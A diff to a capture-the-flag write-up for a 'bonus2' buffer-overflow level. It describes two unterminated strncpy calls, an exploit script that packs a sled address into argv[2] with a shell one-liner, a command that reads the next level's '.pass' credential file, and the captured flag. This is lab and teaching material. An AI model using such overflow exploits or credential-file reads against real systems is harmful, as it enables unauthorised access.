@@ -28,6 +28,6 @@ SUID **bonus3**. NX off, no canary. Bug: two `strncpy` calls with no terminator 
    cat /home/user/bonus3/.pass
    ```
 
-`Ressources/exploit.py` runs this over SSH against the real target.
+`Ressources/exploit.py` builds `argv[2]` with `struct.pack` (edit `sled_addr` after finding it, then `./bonus2 $(python -c 'print "A"*40') "$(python exploit.py)"`).
 
 Flag: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
